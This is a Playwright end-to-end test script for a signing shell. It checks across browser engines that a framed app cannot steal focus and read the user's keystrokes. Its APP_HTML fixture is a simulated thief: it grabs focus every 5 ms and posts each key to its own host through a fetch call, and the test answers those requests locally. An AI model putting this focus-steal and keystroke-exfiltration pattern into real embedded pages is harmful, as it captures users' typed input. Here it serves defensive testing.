// node packages/signpage/scripts/focus-steal.e2e.mjs [--engines chromium,firefox,webkit] [--record <file>]
// The withdraw forms keep the app in the page under the sheet (src/frame-cover.ts WATCHED, src/shell.ts watch()). On each
// engine, SIGN_HOST's real shell (bundled from src/shell.ts with one field on its sheet, scripts/focus-steal.entry.ts)
// frames an APP_HOST page; Playwright answers both hosts, no network.
//   honest: an app that never takes the focus. Under a watched sheet the frame stays, inert, tabindex -1, pointer-events
//           none; the keys typed land in the field and none reaches the app; the close keeps the same app document (one
//           load: no reload). The same run with the sealed cover (what the withdraw forms had) is recorded beside it:
//           there the close loads the app again.
//   thief:  an app that calls focus() every 5 ms once the user has typed two keys, and sends every key it sees to its
//           own host. The fate of each key typed after it starts is recorded: in the field, read by the app (leaked), or
//           lost. The verdict: at most 1 key read by the app before the removal (a frame in its own process gets the keys
//           typed between its steal and the top window's handler), none after it, every later key in the field, the frame
//           out of the page and no frame back before the close, the focus back in the field, and which top-window events
//           came (the window's blur with the frame active, the field's focusout).
// PASS exit 0, FAIL exit 1, error 2.
import { mkdirSync, realpathSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { browserLabel, ENGINES, launchBrowser } from "../../../scripts/browsers.mjs";

const PKG = dirname(dirname(fileURLToPath(import.meta.url)));
const SIGN = "https://confidential.unrealized.trade/";
const APP = "https://ct-app.unrealized.trade/";
const FIRST = "ab";
const AFTER = "cdefgh";

/** The shell and its one field, bundled from this tree's sources. */
export async function bundle() {
  const { build } = await import("vite");
  const out = await build({
    configFile: false,
    logLevel: "silent",
    root: PKG,
    build: { write: false, minify: false, lib: { entry: join(PKG, "scripts/focus-steal.entry.ts"), formats: ["iife"], name: "focusSteal" } },
  });
  return (Array.isArray(out) ? out[0] : out).output[0].code;
}

const TOP_HTML = `<!doctype html><html><head><meta charset="utf-8"></head><body><script src="/entry.js"></script></body></html>`;
// the app: counts its loads and every key it sees, on its own host; __steal starts taking the focus every 5 ms
const APP_HTML = `<!doctype html><html><body><button id="mine">app</button><script>
fetch("/loaded", { method: "POST" });
addEventListener("keydown", (e) => void fetch("/leak?k=" + encodeURIComponent(e.key), { method: "POST" }), true);
window.__steal = () => { const go = () => { window.focus(); document.getElementById("mine").focus(); }; setTimeout(() => (go(), setInterval(go, 5)), 0); };
</script></body></html>`;

async function oneRun(browser, js, { cover, thief }) {
  const ctx = await browser.newContext({ viewport: { width: 1440, height: 900 } });
  const seen = { loads: 0, leaked: [] };
  try {
    await ctx.route(`${SIGN}entry.js`, (r) => r.fulfill({ status: 200, contentType: "text/javascript", body: js }));
    await ctx.route(`${SIGN}`, (r) => r.fulfill({ status: 200, contentType: "text/html", body: TOP_HTML }));
    await ctx.route(`${APP}loaded`, (r) => ((seen.loads += 1), r.fulfill({ status: 204 })));
    await ctx.route(`${APP}leak**`, (r) => (seen.leaked.push(new URL(r.request().url()).searchParams.get("k")), r.fulfill({ status: 204 })));
    await ctx.route(`${APP}`, (r) => r.fulfill({ status: 200, contentType: "text/html", body: APP_HTML }));
    const page = await ctx.newPage();
    await page.goto(SIGN);
    const until = Date.now() + 10_000;
    while (seen.loads < 1 && Date.now() < until) await page.waitForTimeout(50);
    await page.evaluate(() => {
      const t = () => Math.round(performance.now());
      const log = (window.__log = []);
      const f = () => document.querySelector("iframe#app");
      addEventListener("blur", () => log.push(`blur@${t()} active ${document.activeElement === f() && f() ? "frame" : document.activeElement?.id || document.activeElement?.tagName}`), true);
      document.addEventListener("focusout", (e) => log.push(`focusout ${e.target.id || e.target.tagName}@${t()}`), true);
      new MutationObserver(() => !f() && !log.some((l) => l.startsWith("frame out")) && log.push(`frame out@${t()}`)).observe(document.body, { childList: true });
    });
    await page.evaluate((c) => window.__shell.open(c), cover);
    await page.waitForTimeout(300);
    await page.click("#to");
    await page.keyboard.type(FIRST, { delay: 30 });
    if (thief) {
      const app = page.frames().find((fr) => fr.url().startsWith(APP));
      // the steal starts in the app's next task, after this call has answered (the shell may take the frame out at once)
      await app.evaluate(() => window.__steal());
    }
    await page.keyboard.type(AFTER, { delay: 30 });
    await page.waitForTimeout(300);
    const open = await page.evaluate(() => {
      const f = document.querySelector("iframe#app");
      return {
        frame: f ? { inert: f.inert, tabindex: f.getAttribute("tabindex"), pointer: getComputedStyle(f).pointerEvents } : null,
        value: document.getElementById("to").value,
        focus: document.activeElement?.id || document.activeElement?.tagName,
        log: window.__log,
      };
    });
    const loadsOpen = seen.loads;
    await page.evaluate(() => window.__shell.close());
    await page.waitForTimeout(800);
    const typed = FIRST + AFTER;
    const fate = [...AFTER].map((k) => (seen.leaked.includes(k) ? `${k}:leaked` : open.value.includes(k) ? `${k}:field` : `${k}:lost`));
    return { cover, thief, ...open, typed, fate, leaked: seen.leaked.join(""), loadsOpen, loadsAfterClose: seen.loads };
  } finally {
    await ctx.close();
  }
}

export function judge(rec) {
  const lines = [];
  for (const e of rec.engines) {
    if (e.error) {
      lines.push(`FAIL ${e.engine}: ${e.error}`);
      continue;
    }
    const say = (ok, t) => lines.push(`${ok ? "ok  " : "FAIL"} ${e.engine} ${t}`);
    const h = e.honest;
    say(h.frame?.inert === true && h.frame.tabindex === "-1" && h.frame.pointer === "none", `honest, watched: the frame stays under the sheet (${JSON.stringify(h.frame)})`);
    say(h.value === h.typed && h.leaked === "", `honest, watched: the field holds "${h.value}", the app read "${h.leaked}"`);
    say(h.loadsAfterClose === 1, `honest, watched: the close keeps the app document (${h.loadsAfterClose} load(s))`);
    const s = e.sealed;
    lines.push(`info ${e.engine} honest, sealed (before this change): frame ${s.frame ? "in" : "out"}, ${s.loadsAfterClose} load(s) after the close`);
    const t = e.thief;
    // the measured limit: a frame in its own process gets the keys typed between its steal and this window's handler (one
    // at most here); after the removal none reaches it, and every later key lands in the field
    const before = t.fate.findIndex((f) => !f.endsWith(":leaked"));
    const early = before < 0 ? t.fate.length : before;
    say(early <= 1 && t.fate.slice(early).every((f) => f.endsWith(":field")), `thief, watched: ${early} key(s) read by the app before the removal (at most 1), every later key in the field: ${t.fate.join(" ")}`);
    say(t.frame === null, `thief, watched: the frame out of the page (${t.log.join(", ")})`);
    say(t.focus === "to", `thief, watched: the focus back in the field (${t.focus})`);
    const b = e.bare;
    lines.push(`info ${e.engine} thief, kept (no watch, the steal possible at all): keys read by the app "${b.leaked}", ${b.fate.join(" ")}`);
  }
  return { ok: lines.every((l) => !l.startsWith("FAIL")), lines };
}

export async function run(engines = ENGINES) {
  const js = await bundle();
  const rec = { at: new Date().toISOString(), engines: [] };
  for (const engine of engines) {
    let browser;
    try {
      browser = await launchBrowser(engine);
      const e = { engine, label: browserLabel(browser) };
      e.honest = await oneRun(browser, js, { cover: "watched", thief: false });
      e.sealed = await oneRun(browser, js, { cover: "sealed", thief: false });
      e.thief = await oneRun(browser, js, { cover: "watched", thief: true });
      e.bare = await oneRun(browser, js, { cover: "kept", thief: true });
      rec.engines.push(e);
    } catch (err) {
      rec.engines.push({ engine, error: String(err?.message ?? err).split("\n")[0] });
    } finally {
      await browser?.close();
    }
  }
  return rec;
}

if (process.argv[1] && realpathSync(process.argv[1]) === fileURLToPath(import.meta.url)) {
  const a = process.argv.slice(2);
  const opt = (k) => (a.includes(k) ? a[a.indexOf(k) + 1] : null);
  try {
    const rec = await run(opt("--engines")?.split(",") ?? ENGINES);
    if (opt("--record")) {
      mkdirSync(dirname(opt("--record")), { recursive: true });
      writeFileSync(opt("--record"), `${JSON.stringify(rec, null, 1)}\n`);
    }
    const v = judge(rec);
    for (const l of v.lines) console.log(l);
    console.log(`${v.ok ? "PASS" : "FAIL"} focus-steal on ${rec.engines.map((e) => e.label ?? e.engine).join("; ")}`);
    process.exit(v.ok ? 0 : 1);
  } catch (e) {
    console.error(`ERROR focus-steal: ${e?.stack ?? e}`);
    process.exit(2);
  }
}
